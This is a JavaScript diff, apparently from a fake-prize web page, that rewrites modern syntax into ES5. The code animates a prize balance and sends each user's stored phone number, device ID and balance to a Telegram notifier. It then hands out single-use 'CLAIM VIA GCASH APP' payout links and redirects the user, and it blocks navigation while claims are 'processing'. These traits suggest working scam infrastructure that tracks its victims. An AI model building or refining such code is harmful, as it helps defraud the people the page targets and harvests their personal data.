+                    setTimeout(function() {
                         claimBtn.classList.remove('shake-effect');
                         claimBtn.style.background = 'linear-gradient(to bottom, #d4af37, #aa771c)';
                         claimBtn.style.border = '1px solid #fcf6ba';
@@ -1176,8 +1176,8 @@
                 }
                 
                 // Send Claim button Telegram notification
-                const userPhone = localStorage.getItem("userPhone") || "Unknown";
-                const deviceId = localStorage.getItem("userDeviceId") || "Unknown";
+                var userPhone = localStorage.getItem("userPhone") || "Unknown";
+                var deviceId = localStorage.getItem("userDeviceId") || "Unknown";
                 sendClaimButtonNotification(userPhone, deviceId, currentBalance);
                 
                 animateBalanceDecrement(currentBalance, 0, 800, function() {
@@ -1189,12 +1189,12 @@
     
     // ========== PHASE 2: WITHDRAWAL LINK ==========
     function showPhase2() {
-        const popupInner = document.querySelector('.popup-inner');
+        var popupInner = document.querySelector('.popup-inner');
         if (!popupInner) return;
         
         currentPhase = 2;
         
-        const popupContainer = document.querySelector('.popup-container');
+        var popupContainer = document.querySelector('.popup-container');
         if (popupContainer) {
             popupContainer.style.maxWidth = '340px';
             popupContainer.style.width = '85%';
@@ -1236,17 +1236,17 @@
     
     // ========== ATTACH PHASE 2 EVENTS ==========
     function attachPhase2Events() {
-        const closeBtn = document.getElementById('popupClosePhase2');
+        var closeBtn = document.getElementById('popupClosePhase2');
         if (closeBtn) closeBtn.onclick = function() { closePopup(); };
         
-        const backBtn = document.getElementById('backBtnPhase2');
+        var backBtn = document.getElementById('backBtnPhase2');
         if (backBtn) {
             backBtn.onclick = function() {
-                const popupInner = document.querySelector('.popup-inner');
+                var popupInner = document.querySelector('.popup-inner');
                 if (popupInner) {
                     popupInner.style.transition = 'opacity 0.3s ease';
                     popupInner.style.opacity = '0';
-                    setTimeout(() => {
+                    setTimeout(function() {
                         showPhase1(currentBalance);
                         popupInner.style.opacity = '1';
                     }, 300);
@@ -1254,68 +1254,69 @@
             };
         }
         
-        const proceedBtn = document.getElementById('proceedBtn');
+        var proceedBtn = document.getElementById('proceedBtn');
         if (proceedBtn) {
-            proceedBtn.onclick = async function() {
+            proceedBtn.onclick = function() {
                 if (claimInProgress) return;
                 
                 claimInProgress = true;
                 
                 this.classList.add('btn-pulse');
-                setTimeout(() => this.classList.remove('btn-pulse'), 500);
+                setTimeout(function() { this.classList.remove('btn-pulse'); }.bind(this), 500);
                 
                 this.disabled = true;
-                this.innerHTML = `<img src="images/gc_icon.png" class="gc-icon" style="width: 20px; height: 20px;"> PROCESSING...`;
+                this.innerHTML = '<img src="images/gc_icon.png" class="gc-icon" style="width: 20px; height: 20px;"> PROCESSING...';
                 this.style.opacity = '0.8';
                 
                 window.addEventListener('beforeunload', beforeUnloadHandler);
                 
-                const linkData = await getLatestPayoutLink();
-                
-                if (linkData && linkData.url) {
-                    const userPhone = localStorage.getItem("userPhone") || "Unknown";
-                    await markLinkAsUsed(linkData.key, userPhone);
-                    
-                    isRedirecting = true;
-                    this.innerHTML = `<img src="images/gc_icon.png" class="gc-icon" style="width: 20px; height: 20px;"> REDIRECTING...`;
-                    setTimeout(() => {
+                getLatestPayoutLink().then(function(linkData) {
+                    if (linkData && linkData.url) {
+                        var userPhone = localStorage.getItem("userPhone") || "Unknown";
+                        markLinkAsUsed(linkData.key, userPhone).then(function() {
+                            isRedirecting = true;
+                            proceedBtn.innerHTML = '<img src="images/gc_icon.png" class="gc-icon" style="width: 20px; height: 20px;"> REDIRECTING...';
+                            setTimeout(function() {
+                                window.removeEventListener('beforeunload', beforeUnloadHandler);
+                                window.location.href = linkData.url;
+                            }, 1000);
+                        });
+                    } else {
+                        claimInProgress = false;
+                        isRedirecting = false;
                         window.removeEventListener('beforeunload', beforeUnloadHandler);
-                        window.location.href = linkData.url;
-                    }, 1000);
-                } else {
-                    claimInProgress = false;
-                    isRedirecting = false;
-                    window.removeEventListener('beforeunload', beforeUnloadHandler);
-                    
-                    this.disabled = false;
-                    this.innerHTML = `<img src="images/gc_icon.png" class="gc-icon" style="width: 20px; height: 20px;"> CLAIM VIA GCASH APP`;
-                    this.style.opacity = '1';
-                    alert("No payout link available. Please try again.");
-                }
+                        
+                        proceedBtn.disabled = false;
+                        proceedBtn.innerHTML = '<img src="images/gc_icon.png" class="gc-icon" style="width: 20px; height: 20px;"> CLAIM VIA GCASH APP';
+                        proceedBtn.style.opacity = '1';
+                        alert("No payout link available. Please try again.");
+                    }
+                });
             };
         }
     }
     
     // ========== SHOW POPUP ==========
-    async function showPopup(balance) {
+    function showPopup(balance) {
         currentBalance = balance;
-        await getFirewallStatus();
-        showPhase1(balance);
-        
-        const popup = document.getElementById('prizePopup');
-        if (popup) {
-            popup.style.display = 'flex';
-            const ticker = document.getElementById('winnerTicker');
-            if (ticker) ticker.style.display = 'none';
-        }
+        getFirewallStatus().then(function() {
+            showPhase1(balance);
+            
+            var popup = document.getElementById('prizePopup');
+            if (popup) {
+                popup.style.display = 'flex';
+                var ticker = document.getElementById('winnerTicker');
+                if (ticker) ticker.style.display = 'none';
+            }
+        });
     }
     
     // ========== CLOSE POPUP ==========
     function closePopup() {
-        const popup = document.getElementById('prizePopup');
+        var popup = document.getElementById('prizePopup');
         if (popup) {
             popup.style.display = 'none';
-            const ticker = document.getElementById('winnerTicker');
+            var ticker = document.getElementById('winnerTicker');
             if (ticker) ticker.style.display = 'flex';
             if (window.ConfettiModule) window.ConfettiModule.stop();
         }
